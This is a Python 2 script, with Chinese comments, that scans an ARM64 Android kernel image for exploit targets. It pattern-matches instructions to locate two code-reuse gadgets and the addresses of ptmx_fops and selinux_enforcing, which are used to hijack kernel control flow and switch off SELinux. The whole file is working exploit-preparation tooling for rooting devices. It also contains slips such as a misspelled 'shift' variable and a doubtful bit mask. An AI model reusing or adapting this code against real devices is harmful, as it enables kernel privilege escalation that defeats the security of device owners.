#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import struct
import subprocess

gadget1 = []
gadget2 = []
selinux_enforcing = 0
ptmx_fops = 0

def get_address_pre(name):
    result = 0
    contents_pre = []
    f = open("kallsyms.out", "r")

    line = f.readline()
    while line != "":
        line = line.strip('\n')
        contents = line.split(' ')
        #print contents
        if contents[2] == name:
            result = contents_pre[0]
            break
        contents_pre = contents
        line = f.readline()
       
    f.close()
    return result

def get_address_post(name):
    result = 0

    f = open("kallsyms.out", "r")
    line = f.readline()
    while line != "":
        line = line.strip('\n')
        contents = line.split(' ')
        #print contents
        if contents[2] == name:
            next_line = f.readline().strip('\n')
            address = next_line.split(' ')[0]
            # 跳过重复地址
            while address  == contents[0]:
                next_line = f.readline().strip('\n')
                address = next_line.split(' ')[0]
            
            result = address
            break
        line = f.readline()
       
    f.close()
    return str(result)

def get_address(name):
    result = 0

    f = open("kallsyms.out", "r")
    line = f.readline()
    while line != "":
        line = line.strip('\n')
        contents = line.split(' ')
        #print contents
        if contents[2] == name:
            result = contents[0]
            break
        line = f.readline()
    
    f.close()
    return str(result)

# find gadget 1
def find_gedget_1(kernel):

    offset = 0
    while offset < length - 14 * 4:
        begin, insn1, insn2, insn3 = struct.unpack_from("<4I", kernel, offset)
        # ldr x1, [x0, #?]
        if (begin & 0xffc003ff) == 0xf9400001:

            # cbz x1 xxxx
            # add x0, x29, #xx
            # blr x1
            if ((insn1 & 0xff00001f) == 0xb4000001) and ((insn2 & 0xffc003ff) == 0x910003a0) \
               and (insn3 == 0xd63f0020):
                # ldp x29  && ret
                insn1, insn2, insn3 = struct.unpack_from("<3I", kernel, offset + 4 * 4)

                if (((insn1 & 0xffc07fff) == 0xa8c07bfd and insn2 == 0xd65f03c0) or \
                    ((insn2 & 0xffc07fff) == 0xa8c07bfd and insn3 == 0xd65f03c0)):
                    print "find gadget 1, image offset = 0x%x" % offset

                    # get offset from stp of locks_remove_flock
                    count = 0;
                    pre_offset = -1
                    value = struct.unpack_from("<10I", kernel, offset + 4 * 4)
                    while count < 10:
                        if value[count] & 0xffc07fff == 0xa9807bfd:
                            pre_offset = (count + 4) * 4
                            break
                        count += 1

                    if pre_offset != -1:
                        next_address = int(get_address_post("locks_remove_posix"), 16)
                        if pre_offset < next_address - int(get_address("locks_remove_posix"), 16):
                            print "offset before locks_remove_flock = %d" % pre_offset
                            address =  next_address - pre_offset
                            if address not in gadget1:
                                gadget1.append(address)
                            print "virtual kernel address = 0x%x" % address
                    # jump out
                    break
                    
        offset += 4

def find_gedget_2(kernel):
    offset = 0
    while offset < length - 215 * 4:
        begin, insn1, insn2, insn3, insn4 = struct.unpack_from("<5I", kernel, offset)
        # ldr x1, [x0, #??]
        #if (begin & 0xffc003ff) == 0xf9400001:
        ###### or
        # ldr x1, [x0, #160]
        # cbz x1 xxxx

        if (begin & 0xffc003ff) == 0xf9400001 and (insn1 & 0xff00001f) == 0xb4000001:
            #print "image offset: 0x%x, mov insn = 0x%x" % (offset, insn2)

            # mov w0, w2x / mov x0, x2x
            # blr x1
            # cbnz w0, #???? / cbnz x0, #????
            if ((insn2 & 0x7fe0ffff) == 0x2a0003e0) and (insn3 == 0xd63f0020) and ((insn4 & 0x7f00001f) == 0x35000000):
                #print "find gadget 2, opcode = %x, insn2 = 0x%x, insn4 = 0x%x, image offset = 0x%x" % (begin, insn2, insn4, offset)
                # get offset from stp of send_sigio
                count = 0;
                pre_offset = -1
                value = struct.unpack_from("<200I", kernel, offset + 5 * 4)
                while count < 200:
                    if value[count] & 0xffc07fff == 0xa9807bfd:
                    #if value[count] == 0xa9bf7bfd:
                        pre_offset = (count + 1) * 4
                        break
                    count += 1

                if pre_offset != -1:
                    next_address = int(get_address_post("SyS_fcntl"), 16)
                    sys_fcntl_address = int(get_address("SyS_fcntl"), 16)
                    if pre_offset >= 240  and pre_offset < next_address - sys_fcntl_address:
                        print "pre_offset = %d, image offset = 0x%x" % (pre_offset, offset)

                        address =  next_address - pre_offset
                        if address not in gadget2:
                            gadget2.append(address)
                            #print "virtual kernel address = 0x%x" % address

                    # jump out
                #break
                
        offset += 4

def find_ptmx_fops(kernel):
    offset = 0
    next_address = 0
    while offset < length - 1000 * 4:
        pre1, pre2, begin, insn1, insn2, insn3, insn4 = struct.unpack_from("<7I", kernel, offset)
        # add x?, x?, #?
        # add xa, xa, #?
        # mov x0, x?
        if ((pre1 >> 22) == 0x244) and ((pre2 >> 22) == 0x244) and (begin & 0xffe0ffff) == 0xaa0003e0 \
           and (pre2 & 0x1f) == (pre2 >> 5) & 0x1f:
            # bl xxxx
            # adrp x?
            # mov x?
            # add xa, xa, #?
            if ((insn1 & 0xfc000000) == 0x94000000) and ((insn2 >> 24) & 0x9f == 0x90) \
               and ((insn3 & 0xffe0ffe0) == 0xaa0003e0) and ((insn4 >> 22) == 0x244) \
               and ((insn4 & 0x1f) == ((insn4 >> 5) & 0x1f)):
                # adrp x == add x
                reg = insn2 & 0x1f
                if reg != (insn4 & 0x1f):
                    offset += 4
                    continue

                # get offset from stp of next function
                count_num = 0;
                pre_offset = -1
                value = struct.unpack_from("<200I", kernel, offset + 7 * 4)
                while count_num < 200:
                    #if value[count_num] == 0xa9bf7bfd:
                    if value[count_num] & 0xffc07fff == 0xa9807bfd:
                        pre_offset = (count_num + 1) * 4
                        break
                    count_num += 1

                if pre_offset != -1:
                    next_address = int(get_address_post("pty_init"), 16)
                    func_size = next_address - int(get_address("pty_init"), 16)
                    #print "func size = %d " % func_size
                    ## 最大偏移160, sony z3+
                    if pre_offset < func_size:
                        #print "offset before next function = %d" % pre_offset
                        address = next_address - pre_offset
                        #print "add insn virtual kernel address = 0x%x" % address

                        start = (offset - (func_size - pre_offset - 6 * 4)) / 4 * 4
                        size = (func_size - pre_offset - 3 * 4) / 4
                        fmt = "<{}I".format(size)
                        #print "fmt = %s" % fmt
                        insn = struct.unpack_from(fmt, kernel, start)

                        # 反向查找指令
                        reg1 = -1
                        reg2 = -1
                        reg3 = -1

                        add1 = 0
                        add2 = 0

                        pc_offset = 0

                        count = size - 1
                        while count > 0:
                            # mov x0, x?
                            # print "code = 0x%x" % insn[count]

                            # mov x0, xa
                            if reg1 == -1 and insn[count] & 0xffe0ffff == 0xaa0003e0:
                                reg1 = (insn[count] >> 16) & 0x1f
                                #print "reg1 = %d " % reg1

                            # add xa, xb, #?
                            elif reg2 == -1 and reg1 >= 0 \
                                 and (insn[count] & 0xffc0001f) == (0x91000000 | reg1):
                                reg2 = (insn[count] >> 5) & 0x1f
                                #print "reg2 = %d " % reg2
                                shift = (insn[count] >> 22) & 0x11
                                imm = (insn[count] >> 10) & 0xfff
                                if (shift == 0x00):
                                    add1 = imm
                                elif (shit == 0x01):
                                    add1 = imm << 12
                                #print "add1 = 0x%x" % add1
                                #偏移为0x10
                                if reg2 == reg1 or add1 != 0x10:
                                    break

                            # add xb, xc, #?
                            elif reg3 == -1 and reg2 >= 0 \
                                 and (insn[count] & 0xffc0001f) == (0x91000000 | reg2):
                                reg3 = (insn[count] >> 5) & 0x1f
                                #print "reg3 = %d" % reg3
                                shift = (insn[count] >> 22) & 0x11
                                imm = (insn[count] >> 10) & 0xfff
                                if (shift == 0x00):
                                    add2 = imm
                                elif (shit == 0x01):
                                    add2 = imm << 12
                                #print "add2 = 0x%x" % add2

                            # adrp xc, offset
                            elif reg3 >=0 and (insn[count] & 0x9f00001f) == (0x90000000 | reg3):
                                #print "adrp code = 0x%x" % insn[count]
                                immlow = (insn[count] >> 29) & 0x3
                                immhigh = (insn[count] >> 5) & 0x7ffff
                                pc_offset = ((immhigh << 2) | immlow) << 12
                                print "ptmx: pc offset of adrp = 0x%x" % pc_offset

                                pre_offset2 = pre_offset + (7 * 4) + offset - start - (count + 1) * 4
                                print "adrp addresss = 0x%x" % (next_address - pre_offset2)
                                # 页对齐 ＋ 偏移
                                address = ((next_address - pre_offset2) & ~0xfff) + pc_offset
                                address = address + add1 + add2
                                print "virtual address of ptmx_fops = 0x%x" % address
                                global ptmx_fops
                                ptmx_fops = address
                                break

                            count -= 1

                        #break
                    # jump out
                #break

        offset += 4

def find_selinux_enforcing(kernel):
    offset = 0
    while offset < length - 215 * 4:
        begin, insn1, insn2, insn3, insn4, insn5 = struct.unpack_from("<6I", kernel, offset)
        # ldr x0, [x29, #24]
        # cmp x0, xzr

        if begin == 0xf9400fa0 and insn1 == 0xeb1f001f:
            # adrp x0,xxxx
            # cset w1, ne
            # str w1, [x0, #????]
            # mov w0, #0x1
            if ((insn2 & 0x9f00001f) == 0x90000000) and insn3 == 0x1a9f07e1 \
               and (insn4 & 0xffc003ff) == 0xb9000001 and insn5 == 0x52800020:
                print "find selinux insn, image offset = 0x%x" % offset

                next_address = int(get_address_post("enforcing_setup"), 16)
                immlow = (insn2 >> 29) & 0x3
                immhigh = (insn2 >> 5) & 0x7ffff
                pc_offset = ((immhigh << 2) | immlow) << 12
                print "selinux_enforcing: pc offset of adrp = 0x%x" % pc_offset

                scale = (insn4 >> 30) & 0x3
                add1 = ((insn4 >> 10) & 0xfff) << scale
                address = ((next_address - (3 + 3) * 4) & ~0xfff) + pc_offset + add1
                print "virtual kernel address of selinux_enforcing = 0x%x" % address
                global selinux_enforcing
                selinux_enforcing = address
                # jump out
                break

        offset += 4

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "usage: %s <kernel image>" % sys.argv[0]
        sys.exit(0)


    print "+++++ get kernel symbols from kernel Image ..."
    ret = subprocess.call("./static_kallsyms-arm64.py %s" % sys.argv[1], shell=True)
    if (ret == 0):
        f = open(sys.argv[1], "rb")
        kernel = f.read()
        # close 
        f.close()
        length = len(kernel)
        print "total length of \"%s\" = 0x%x" % (sys.argv[1], length)

        print "+++++ get ptmx_fops address ..."
        ptmx_fops = int(get_address("ptmx_fops"), 16)

        ###################
        ptmx_fops = 0
        ####################
        if ptmx_fops == 0:
            find_ptmx_fops(kernel)

        print "+++++ get gadget 1 address ..."
        find_gedget_1(kernel)
        print "+++++ get gadget 2 address ..."
        find_gedget_2(kernel)

        print "+++++ get selinux_enforcing address ..."
        selinux_enforcing = int(get_address("selinux_enforcing"), 16)
        ####################
        selinux_enforcing = 0
        ####################

        if selinux_enforcing == 0:
            find_selinux_enforcing(kernel)

        print "****************************************************************"
        print "gadget 1:"
        for g in gadget1:
            print "0x%016x" % g
        print "gadget 2:"
        for g in gadget2:
            print "0x%016x" % g

        print "selinux_enforcing: \n0x%016x" % selinux_enforcing
        print "ptmx_fops: \n0x%016x \n" % ptmx_fops
        print "****************************************************************"
